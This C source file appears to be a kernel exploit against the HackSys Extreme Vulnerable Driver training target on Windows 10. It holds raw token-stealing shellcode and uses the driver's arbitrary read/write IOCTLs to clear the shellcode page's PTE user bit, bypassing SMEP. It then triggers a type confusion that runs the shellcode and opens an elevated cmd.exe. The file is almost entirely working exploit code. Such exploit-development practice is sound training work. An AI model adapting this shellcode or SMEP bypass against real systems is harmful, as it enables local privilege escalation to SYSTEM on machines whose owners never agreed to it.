#include "Common.h"
#include "Exploits.h"

/*
   HEVD Type Confusion / Medium Integrity

   Author: @xct_de
   Target: 10.0.19044

   This type confusion essentially just executes at a addr we give it. This version "cheats" and uses the Read/Write PTE method to do disable SMEP.

   Debug: 
   ba e1 HEVD!TypeConfusionObjectInitializer+0x37
   ba e1 HEVD!TriggerArbitraryWrite
*/

int HevdTypeConfusionMI(int argc, char** argv) {
	printf("~-----------------------------~\n");
	printf("  Running HevdTypeConfusionMI  \n");
	printf("~-----------------------------~\n");

	DWORD MiGetPteAddressOffset = 0x221ef0;
	BOOL resultIOCTL = false;

	typedef struct _TypeConfBuffer
	{
		uintptr_t junkClientID;
		uintptr_t controllableFunc;
	} TypeConfBuffer;

	typedef struct _ArbitraryReadBuffer
	{
		uintptr_t readAddress;
		uintptr_t outBuf;
	} ArbitraryReadBuffer;

	typedef struct _WriteWhatWhereBuffer
	{
		uintptr_t what;
		uintptr_t where;
	} WriteWhatWhereBuffer;


	// TokenStealingBail Shellcode
	BYTE sc[256] = {
		0x48, 0x31, 0xc0, 0x65, 0x48, 0x8b, 0x80, 0x88, 0x01, 0x00,
		0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89,
		0xc1, 0x48, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8b,
		0x00, 0x48, 0x8b, 0x50, 0xf8, 0x49, 0x89, 0xc0, 0x48, 0x8b,
		0x00, 0x48, 0x83, 0xfa, 0x04, 0x75, 0xf0, 0x49, 0x8b, 0x50,
		0x70, 0x48, 0x83, 0xe2, 0xf8, 0x49, 0x8b, 0x89, 0xb8, 0x04,
		0x00, 0x00, 0x48, 0x83, 0xe1, 0x07, 0x48, 0x01, 0xca, 0x49,
		0x89, 0x91, 0xb8, 0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04,
		0x25, 0x88, 0x01, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01,
		0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01,
		0x00, 0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48,
		0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78,
		0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00,
		0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f,
		0x01, 0xf8, 0x48, 0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff
	};

	HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDriver == INVALID_HANDLE_VALUE)
	{
		printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
		exit(1);
	}

	// get base address of kernel & driver (only works from medium integrity)
	ULONGLONG ntBase = getBaseAddr(L"ntoskrnl.exe");
	printf("[+] NT base: %llx\n", ntBase);

	// sc buffer
	LPVOID sc_ptr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("[+] Shellcode: %llx\n", sc_ptr);
	RtlCopyMemory(sc_ptr, sc, sizeof(sc));

	// use pte U/S method to flip SMEP off via write primitive (yes this is cheating, but I could not find a reliable stack pivot in this windows version)
	// read pte address using arb. read
	printf("[*] Disabling SMEP\n");
	ULONGLONG readBuffer = 0;
	ArbitraryReadBuffer arbReadBuf = { 0 };
	uintptr_t readAddress = (uintptr_t)ntBase + MiGetPteAddressOffset + 0x13;
	arbReadBuf.readAddress = readAddress;
	arbReadBuf.outBuf = (ULONG_PTR)&readBuffer;
	resultIOCTL = false;
	resultIOCTL = DeviceIoControl(hDriver, IOCTL(0x802), (LPVOID)&arbReadBuf, sizeof(arbReadBuf), NULL, 0, NULL, NULL);
	if (!resultIOCTL) {
		printf("[-] Could not get PteBase (IOCTL failed).\n");
		return -1;
	}
	if (readBuffer == 0) {
		printf("[-] Failed getting PteBase (readBuffer == 0)!\n");
		return -1;
	}
	printf("  [+] PteBase: 0x%llx\n", readBuffer);
	ULONGLONG pteBase = readBuffer;

	uintptr_t shellcodePte = getPteAddress(sc_ptr, (PVOID)pteBase);
	printf("  [+] PteAddress of Shellcode: 0x%llx\n", shellcodePte);

	// read pte value using arb. read
	readBuffer = { 0 };
	arbReadBuf.readAddress = shellcodePte;
	arbReadBuf.outBuf = (ULONG_PTR)&readBuffer;
	resultIOCTL = false;
	resultIOCTL = DeviceIoControl(hDriver, IOCTL(0x802), (LPVOID)&arbReadBuf, sizeof(arbReadBuf), NULL, 0, NULL, NULL);
	if (!resultIOCTL) {
		printf("[-] Could not get PteData (IOCTL failed).\n");
		return -1;
	}
	if (readBuffer == 0) {
		printf("[-] Failed getting PteData (readBuffer == 0)!\n");
		return -1;
	}
	printf("  [+] PTE Data of Shellcode: 0x%llx\n", readBuffer);
	_mm_clflush(&sc_ptr);
	
	// write back using arb. write
	readBuffer = readBuffer & ~0x4;
	_WriteWhatWhereBuffer arbWriteBuf = { 0 };
	arbWriteBuf.what = (ULONG_PTR)&readBuffer;
	arbWriteBuf.where = shellcodePte;
	resultIOCTL = false;
	resultIOCTL = DeviceIoControl(hDriver, IOCTL(0x802), (LPVOID)&arbWriteBuf, sizeof(arbWriteBuf), NULL, 0, NULL, NULL);
	if (!resultIOCTL) {
		printf("[-] Could not write new PTE Data (IOCTL failed).\n");
		return -1;
	}
	printf("[+] SMEP disabled\n");
	
	// exploit type confusion, will execute our stack_pivot & return into the fake stack
	TypeConfBuffer tcBuf = { 0 };
	tcBuf.junkClientID = 0xAABBCCDDEEFFEEDD;
	tcBuf.controllableFunc = (ULONG_PTR) sc_ptr;

	printf("\n[*] Press enter to exploit...\n");
	getchar();

	DeviceIoControl(hDriver, IOCTL(0x808), &tcBuf, sizeof(tcBuf), NULL, 0, NULL, NULL);
	system("cmd.exe");
	return 0;
}